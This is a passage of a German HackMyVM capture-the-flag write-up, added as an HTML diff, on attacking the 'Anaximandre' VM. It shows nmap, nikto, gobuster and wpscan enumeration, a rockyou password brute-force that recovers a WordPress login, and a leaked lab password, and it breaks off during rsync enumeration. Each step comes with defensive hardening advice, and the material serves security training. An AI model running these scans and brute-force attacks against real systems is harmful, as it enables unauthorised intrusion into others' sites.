@@ -1,0 +1,1059 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anaximandre - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Anaximandre - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <!-- HINWEIS: Klasse 'level-medium' wird verwendet, um GELB gemäß Anforderung zu erzwingen -->
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle level-medium-circle"> <!-- Zusätzliche Klasse für CSS-Targeting der Kreis-Farbe -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrund wird durch CSS gesteuert -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">rsync</div>
+                <div class="tool-item">ccrypt</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration (WordPress)</a></li>
+                 <li><a href="#rsync-enumeration">Rsync Enumeration</a></li>
+                 <li><a href="#lfi-rce">LFI / RCE Exploitation</a></li>
+                 <li><a href="#initial-access">Initial Access</a></li>
+                 <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung aktiver Hosts im lokalen Netzwerk mittels `arp-scan -l`. Dieses Tool sendet ARP-Anfragen, um IP- und MAC-Adressen von Geräten im selben Netzwerksegment zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `arp-scan` findet erfolgreich ein Zielsystem mit der IP-Adresse `192.168.2.114`. Die zugehörige MAC-Adresse `08:00:27:7e:5b:33` gehört laut OUI-Lookup (PCS Systemtechnik GmbH) zu Oracle VirtualBox, was darauf hindeutet, dass es sich um eine virtuelle Maschine handelt. Dies ist die primäre IP für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP `192.168.2.114` als Ziel für detailliertere Scans (Nmap, Nikto etc.) verwenden. Die MAC-Adresse notieren, bestätigt die Virtualisierungsumgebung.<br><strong>Empfehlung (Admin):</strong> Netzwerkmonitoring implementieren, um ARP-Scans zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.114</span>	<span class="command">08:00:27:7e:5b:33</span>	<span class="command">PCS Systemtechnik GmbH</span>
+</pre>
+                </div>
+            </div>
+
+            <hr>
+            <!-- HINWEIS: Der Schritt vi /etc/hosts fehlt im Originaltext, wird daher hier nicht eingefügt. Nmap verwendet direkt die IP. -->
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird gegen die Ziel-IP `192.168.2.114` durchgeführt, um offene Ports, Dienste, Versionen und Betriebssysteminformationen zu sammeln.
+                *   `-sS`: SYN-Scan (Stealth).
+                *   `-sC`: Führt Standard-Nmap-Skripte aus.
+                *   `-sV`: Versionserkennung.
+                *   `-T5`: Sehr schnelles Timing (riskant, potenziell ungenau/laut).
+                *   `-A`: Aggressiver Scan (OS-Erkennung, Version, Skripte, Traceroute).
+                *   `-O`: OS-Erkennung (Teil von `-A`).
+                *   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert drei offene Ports:
+                *   **Port 22 (SSH):** Läuft OpenSSH 8.4p1 (Debian). Dies ist ein potenzieller Zugangspunkt.
+                *   **Port 80 (HTTP):** Läuft Apache 2.4.54 (Debian). Die `-sC`-Skripte erkennen eine WordPress-Installation (Version 6.1.1) mit dem Titel "Geographia". WordPress ist ein sehr häufiges Ziel für Angriffe.
+                *   **Port 873 (Rsync):** Der Rsync-Dienst ist aktiv und kommuniziert mit Protokollversion 31. Rsync wird oft für Datei-Synchronisation und Backups verwendet und kann bei Fehlkonfiguration Daten leaken.
+            Die OS-Erkennung deutet auf ein Linux-System (Kernel 4.x/5.x) hin. Die MAC-Adresse bestätigt VirtualBox.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die drei offenen Ports sind Angriffsvektoren:
+                1.  **HTTP (WordPress):** Priorität. Mit Tools wie `wpscan` oder `nikto` weiter untersuchen. Nach Schwachstellen in WP Core 6.1.1, Plugins und Themes suchen. Login (`/wp-login.php`) auf Brute-Force prüfen.
+                2.  **Rsync:** Prüfen, ob anonyme Verbindungen möglich sind und welche Module (Shares) angeboten werden (`rsync rsync://192.168.2.114/`).
+                3.  **SSH:** Vorerst zurückstellen, aber Benutzernamen aus der WP-Enumeration könnten später hier getestet werden.<br>
+            <strong>Empfehlung (Admin):</strong> WordPress und alle Plugins/Themes aktuell halten. Rsync sicher konfigurieren (Authentifizierung, Zugriffsbeschränkung, Firewall). SSH härten (starke Passwörter/Keys, Fail2Ban).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.114 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 22:37 CEST
+Nmap scan report for anaximandre.hmv (192.168.2.114)
+Host is up (0.00013s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+<span class="command">22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 ee71f4ada071e1351986abc8e6be3617 (RSA)
+|   256 401cc3da83d72f60cb12473b02670414 (ECDSA)
+|_  256 1a69a7f9dca549ffd27dce45976d8ab9 (ED25519)
+<span class="command">80/tcp  open  http    Apache httpd 2.4.54 ((Debian))</span>
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-generator: <span class="command">WordPress 6.1.1</span>
+|_http-title: Geographia
+<span class="command">873/tcp open  rsync   (protocol version 31)</span>
+MAC Address: 08:00:27:7E:5B:33 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms anaximandre.hmv (192.168.2.114)
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (WordPress)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird erneut gegen Port 80 auf dem Zielhost `anaximandre.hmv` (der Name wurde vermutlich zuvor in `/etc/hosts` eingetragen) ausgeführt. Die Option `-C all` aktiviert alle Check-Typen für einen gründlicheren Scan.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die Apache-Version und findet spezifische WordPress-bezogene Informationen und potenzielle Schwachstellen:
+                *   Fehlende Security Header (`X-Frame-Options` auf `/`, `X-Content-Type-Options`).
+                *   Ein `Link`-Header, der auf die WP-JSON-API (`/index.php/wp-json/`) verweist.
+                *   Ein ungewöhnlicher Header `X-Redirect-By: WordPress` auf `/index.php`.
+                *   Hinweise auf die Akismet-Plugin-Datei `readme.txt`.
+                *   `wp-links-opml.php` kann die WP-Version verraten.
+                *   `license.txt` gefunden.
+                *   Bestätigung der WordPress-Installation.
+                *   WordPress-Test-Cookie ohne `HttpOnly`-Flag auf der Registrierungsseite (`/wp-login.php?action=register`).
+                *   Verzeichnisauflistung für das Upload-Verzeichnis (`/wp-content/uploads/`) - kritisch!
+                *   Login-Seite `/wp-login.php` gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis `/wp-content/uploads/` sofort auf interessante hochgeladene Dateien prüfen. Die WP-JSON-API auf öffentlich zugängliche Endpunkte untersuchen. Die Login-Seite für Enumeration und Brute-Force vormerken. Die gefundenen Dateien (`readme.txt`, `license.txt`, `wp-links-opml.php`) analysieren.<br><strong>Empfehlung (Admin):</strong> Fehlende Security Header implementieren. Verzeichnisauflistung deaktivieren, insbesondere für `/wp-content/uploads/`. WordPress-Login härten (Fail2Ban, Captcha, 2FA). WP-JSON-API einschränken, wenn nicht benötigt. Cookies sicher konfigurieren (HttpOnly, Secure).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nikto -h http://anaximandre.hmv -C all</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.114
++ Target Hostname:    anaximandre.hmv
++ Target Port:        80
++ Start Time:         2023-04-11 22:38:26 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ /: The anti-clickjacking <span class="command">X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: Drupal Link header found with value: <span class="command"><http://anaximandre.hmv/index.php/wp-json/>; rel="https://api.w.org/"</span>. See: https://www.drupal.org/
++ /: The <span class="command">X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /index.php?: Uncommon header 'x-redirect-by' found, with contents: WordPress.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ /license.txt: License file found may identify site software.
++ /: A Wordpress installation was found.
++ /wp-login.php?action=register: Cookie <span class="command">wordpress_test_cookie created without the httponly flag.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ <span class="command">/wp-content/uploads/: Directory indexing found.</span>
++ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
++ <span class="command">/wp-login.php: Wordpress login found.</span>
++ 26502 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2023-04-11 22:39:43 (GMT2) (77 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden.
+                *   `dir`: Modus für Verzeichnissuche.
+                *   `-u http://anaximandre.hmv`: Die Ziel-URL.
+                *   `-x ...`: Eine lange Liste von Dateiendungen zum Testen.
+                *   `-w "/usr/.../directory-list-2.3-medium.txt"`: Die Wortliste.
+                *   `-b '403,404'`: Ignoriert Statuscodes 403 und 404.
+                *   `-e`: Erweiterter Modus (zeigt volle URL).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster bestätigt viele Standard-WordPress-Pfade und -Dateien, die auch Nikto teilweise fand:
+                *   `/index.php` (leitet zu `/` weiter)
+                *   `/wp-content/`
+                *   `/wp-login.php` (Status 200 OK)
+                *   `/license.txt` (Status 200 OK)
+                *   `/wp-includes/`
+                *   `/wp-trackback.php` (Status 200 OK)
+                *   `/wp-admin/`
+                *   `/xmlrpc.php` (Status 405 Method Not Allowed - deutet auf Existenz hin, aber GET ist nicht erlaubt)
+                *   `/wp-signup.php` (leitet zur Registrierungsseite weiter)</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen WP-Standardpfade und -dateien sind nützlich für gezielte Angriffe mit WPScan. `xmlrpc.php` trotz Status 405 weiter untersuchen (POST-Requests könnten funktionieren). `/wp-login.php` ist der primäre Angriffspunkt für Logins.<br><strong>Empfehlung (Admin):</strong> Zugriff auf nicht benötigte WP-Dateien (wie `license.txt`, `wp-trackback.php`, `xmlrpc.php` falls ungenutzt) einschränken. WordPress-Installation härten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">gobuster dir -u http://anaximandre.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e</span></div>
+                    <pre>
+===============================================================
+<span class="command">http://anaximandre.hmv/index.php</span>            (Status: 301) [Size: 0] [--> http://anaximandre.hmv/]
+<span class="command">http://anaximandre.hmv/wp-content</span>           (Status: 301) [Size: 323] [--> http://anaximandre.hmv/wp-content/]
+<span class="command">http://anaximandre.hmv/wp-login.php</span>         (Status: 200) [Size: 4993]
+<span class="command">http://anaximandre.hmv/license.txt</span>          (Status: 200) [Size: 19915]
+<span class="command">http://anaximandre.hmv/wp-includes</span>          (Status: 301) [Size: 324] [--> http://anaximandre.hmv/wp-includes/]
+<span class="command">http://anaximandre.hmv/wp-trackback.php</span>     (Status: 200) [Size: 135]
+<span class="command">http://anaximandre.hmv/wp-admin</span>             (Status: 301) [Size: 321] [--> http://anaximandre.hmv/wp-admin/]
+<span class="command">http://anaximandre.hmv/xmlrpc.php</span>           (Status: 405) [Size: 42]
+<span class="command">http://anaximandre.hmv/wp-signup.php</span>        (Status: 302) [Size: 0] [--> http://anaximandre.hmv/wp-login.php?action=register]
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `curl -I -v` werden die HTTP-Header der Login-Seite `/wp-login.php` abgerufen. `-I` sendet eine HEAD-Anfrage (nur Header), `-v` aktiviert den Verbose-Modus für detaillierte Verbindungs- und Header-Informationen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe bestätigt den Status 200 OK. Wichtige Header:
+                *   `Server: Apache/2.4.54 (Debian)`
+                *   `Set-Cookie: wordpress_test_cookie=...`: Bestätigt das Test-Cookie.
+                *   `X-Frame-Options: SAMEORIGIN`: Dieser Header *ist* auf der Login-Seite gesetzt (im Gegensatz zur Startseite, laut Nikto), was Clickjacking auf dieser spezifischen Seite verhindert.
+                *   `Content-Type: text/html; charset=UTF-8`</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Header bestätigen die Server-Software und das Vorhandensein von WordPress. Die X-Frame-Options auf der Login-Seite sind eine gute Sicherheitspraxis, aber nicht auf der Startseite implementiert.<br><strong>Empfehlung (Admin):</strong> Sicherheitsheader konsistent über die gesamte Website implementieren. Insbesondere `X-Frame-Options` oder die modernere `Content-Security-Policy` (CSP) mit `frame-ancestors` sollten auf allen Seiten gesetzt sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl -I http://anaximandre.hmv/wp-login.php -v</span></div>
+                    <pre>
+*   Trying 192.168.2.114:80...
+* Connected to anaximandre.hmv (192.168.2.114) port 80 (#0)
+> HEAD /wp-login.php HTTP/1.1
+> Host: anaximandre.hmv
+> User-Agent: curl/7.88.1
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+< Date: Tue, 11 Apr 2023 20:42:33 GMT
+Date: Tue, 11 Apr 2023 20:42:33 GMT
+< Server: <span class="command">Apache/2.4.54 (Debian)</span>
+Server: Apache/2.4.54 (Debian)
+< Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+< Cache-Control: no-cache, must-revalidate, max-age=0
+Cache-Control: no-cache, must-revalidate, max-age=0
+< Set-Cookie: <span class="command">wordpress_test_cookie=WP%20Cookie%20check; path=/</span>
+Set-Cookie: wordpress_test_cookie=WP%20Cookie%20check; path=/
+< <span class="command">X-Frame-Options: SAMEORIGIN</span>
+X-Frame-Options: SAMEORIGIN
+< Content-Type: text/html; charset=UTF-8
+Content-Type: text/html; charset=UTF-8
+
+< 
+* Connection #0 to host anaximandre.hmv left intact
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `wpscan`, ein spezialisierter WordPress-Sicherheitsscanner, wird verwendet, um die Installation detailliert zu untersuchen.
+                *   `--url http://192.168.2.114`: Ziel-URL.
+                *   `-e`: Aktiviert die Enumeration von allem Möglichen (Versionen, Plugins, Themes, Benutzer etc.). Es wurde kein spezifischer Enumerationstyp wie `vp` (vulnerable plugins) oder `u` (users) angegeben, daher ist `-e` nicht ideal, oft wird `-e vp,vt,u` verwendet. Hier scheint es trotzdem Benutzer zu enumerieren.
+                *   `--api-token ...`: Ein API-Token für die WPScan Vulnerability Database, um aktuelle Schwachstelleninformationen abzurufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> WPScan liefert eine Fülle kritischer Informationen:
+                *   Bestätigt Server und aktivierte `xmlrpc.php`.
+                *   Bestätigt das aktivierte Directory Listing für `/wp-content/uploads/`.
+                *   Identifiziert die **WordPress-Version 6.1.1** als **veraltet** (released 2022-11-15).
+                *   Meldet eine **bekannte Schwachstelle (CVE-2022-3590)** in WP <= 6.2: Unauthenticated Blind SSRF via DNS Rebinding. Dies ist ein potenzieller Angriffsvektor.
+                *   Keine verwundbaren Plugins oder Themes gefunden (aber die Core-Version ist verwundbar).
+                *   **Enumeriert erfolgreich zwei Benutzernamen: `admin` und `webmaster`**. Dies ist entscheidend für Passwortangriffe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Benutzernamen `admin` und `webmaster` als Ziel für Brute-Force-Angriffe auf `/wp-login.php` verwenden. Die SSRF-Schwachstelle (CVE-2022-3590) untersuchen und versuchen auszunutzen, auch wenn sie "blind" ist (könnte für interne Portscans oder das Erreichen interner Dienste nützlich sein). `/wp-content/uploads/` manuell durchsuchen.<br><strong>Empfehlung (Admin):</strong> **WordPress Core sofort auf die neueste Version aktualisieren!** Dies ist die wichtigste Maßnahme. Benutzerenumeration durch Sicherheitsplugins oder Konfiguration erschweren. XML-RPC deaktivieren, falls nicht benötigt. Uploads-Verzeichnis schützen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">wpscan --url http://192.168.2.114 -e --api-token ...</span></div>
+                    <pre>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.2.114/ [192.168.2.114]
+[+] Started: Tue Apr 11 22:55:56 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.54 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] <span class="command">XML-RPC seems to be enabled: http://192.168.2.114/xmlrpc.php</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] <span class="command">Upload directory has listing enabled: http://192.168.2.114/wp-content/uploads/</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.2.114/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] <span class="command">WordPress version 6.1.1 identified (Outdated, released on 2022-11-15).</span>
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://192.168.2.114/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.1.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://192.168.2.114/, Match: 'WordPress 6.1.1'
+ |
+ | <span class="password">[!] 1 vulnerability identified:</span>
+ |
+ | <span class="password">[!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
+ |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:00 <==============================================================================================================> (496 / 496) 100.00% Time: 00:00:00
+
+[i] No themes Found.
+
+[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:02 <============================================================================================================> (2568 / 2568) 100.00% Time: 00:00:02
+
+[i] No Timthumbs Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+ Checking DB Exports - Time: 00:00:00 <=====================================================================================================================> (71 / 71) 100.00% Time: 00:00:00
+
+[i] No DB Exports Found.
+
+[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
+ Brute Forcing Attachment IDs - Time: 00:00:01 <==========================================================================================================> (100 / 100) 100.00% Time: 00:00:01
+
+[i] No Medias Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+<span class="password">[+] admin</span>
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+<span class="password">[+] webmaster</span>
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 1
+ | Requests Remaining: 74
+
+[+] Finished: Tue Apr 11 22:56:15 2023
+[+] Requests Done: 3389
+[+] Cached Requests: 42
+[+] Data Sent: 943.826 KB
+[+] Data Received: 496.049 KB
+[+] Memory used: 233.574 MB
+[+] Elapsed time: 00:00:18
+</pre>
+                </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> WPScan wird erneut ausgeführt, diesmal gezielt für einen Passwort-Brute-Force-Angriff.
+                *   `--url http://192.168.2.114`: Ziel-URL.
+                *   `--usernames webmaster`: Greift nur den Benutzer `webmaster` an.
+                *   `--passwords /usr/share/wordlists/rockyou.txt`: Verwendet die `rockyou.txt`-Wortliste.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist sehr schnell erfolgreich! WPScan findet das gültige Passwort `<span class="password">mickey</span>` für den Benutzer `<span class="command">webmaster</span>`. Dies ist ein kritischer Fund und ermöglicht den initialen Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit den Anmeldedaten `webmaster:mickey` im WordPress-Adminbereich (`/wp-admin/` oder `/wp-login.php`) anmelden. Nach Möglichkeiten suchen, Code auszuführen oder Dateien hochzuladen (z.B. Plugin-/Theme-Editor, Plugin-/Theme-Upload).<br><strong>Empfehlung (Admin):</strong> Starke, einzigartige Passwörter erzwingen. Keine leicht zu erratenden Passwörter verwenden. WordPress-Login durch zusätzliche Maßnahmen (2FA, Captcha, IP-Blockierung nach Fehlversuchen via Fail2Ban) schützen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">wpscan --url http://192.168.2.114 --usernames webmaster --passwords /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+[+] Performing password attack on Xmlrpc against 1 user/s
+<span class="password">[SUCCESS] - webmaster / mickey</span>                                                                                                                                                                
+Trying webmaster / alexandra Time: 00:00:02 <                                                                                                         > (115 / 14344521)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: webmaster, Password: mickey
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 0
+ | Requests Remaining: 74
+
+[+] Finished: Tue Apr 11 23:03:24 2023
+[+] Requests Done: 284
+[+] Cached Requests: 6
+[+] Data Sent: 104.041 KB
+[+] Data Received: 255.732 KB
+[+] Memory used: 227.656 MB
+[+] Elapsed time: 00:00:08
+</pre>
+                </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Pentester beschreibt die nächsten Schritte und einen weiteren Fund. Nach dem Login als `webmaster:mickey` gab es Probleme beim Versuch, eine Reverse Shell zu erstellen (Seite hing). Parallel wurde eine "Mail" des Admins gefunden (Quelle unklar, vielleicht aus `/wp-content/uploads/` oder einer anderen Datei), die einen wichtigen Hinweis enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die "Mail" enthält eine Notiz ("note to self") mit dem String `<span class="password">Yn89m1RFBJ</span>`. Dies sieht wie ein Passwort oder ein Schlüssel aus. Die Erwähnung von IPs (`192.168.0.31`, `192.168.0.29`) könnte auf ein anderes Netzwerksegment oder die ursprüngliche Konfigurationsumgebung hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das gefundene Passwort/Schlüssel `Yn89m1RFBJ` notieren und aufbewahren. Es könnte für SSH, Sudo, oder, wie sich später herausstellt, für die Entschlüsselung von Dateien (z.B. aus Rsync) relevant sein. Die Probleme beim Erstellen der Reverse Shell über WordPress könnten auf eingeschränkte Berechtigungen oder Sicherheitsmaßnahmen hindeuten – andere Wege suchen.<br><strong>Empfehlung (Admin):</strong> Sensible Informationen wie Passwörter oder Notizen niemals in Bereichen speichern, die potenziell zugänglich sind (Webserver-Verzeichnisse, E-Mails auf dem Server etc.).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies beschreibender Text ist -->
+                     <pre>
+logge mich ein und wollte eine rev shell erstellen, doch die 
+Seite lädt ewig und hängt irgendwie. Anschliessend habe ich 
+meine Nachrichten geckeckt und die Mail des Admins gelesen in 
+der ein passwort enthalten war:
+</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da dies der Inhalt der "Mail"/Notiz ist -->
+                     <pre>
+ Mail 
+ 
+
+admin
+192.168.0.31
+admin@localhost.com
+192.168.0.29	
+
+CONFIDENTIAL
+NOT TO BE PUBLISHED
+
+note to self: <span class="password">Yn89m1RFBJ</span>
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="rsync-enumeration">
+            <h2>Rsync Enumeration</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Rsync-Dienst auf Port 873 wird untersucht.
+                *   `rsync rsync://192.168.2.114`: Versucht, die verfügbaren Rsync-Module (Shares) aufzulisten.
+                *   `rsync rsync://192.168.2.114/share_rsync`: Versucht, den Inhalt des Moduls `share_rsync` aufzulisten.
+                *   `rsync rsync://192.168.2.114/Journal`: Versucht, auf ein Modul namens `Journal` zuzugreifen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   Die erste Abfrage zeigt erfolgreich das Modul `<span class="command">share_rsync</span>` an (und implizit "Journal" als Kommentar oder Teil des Modulnamens? Unklar).
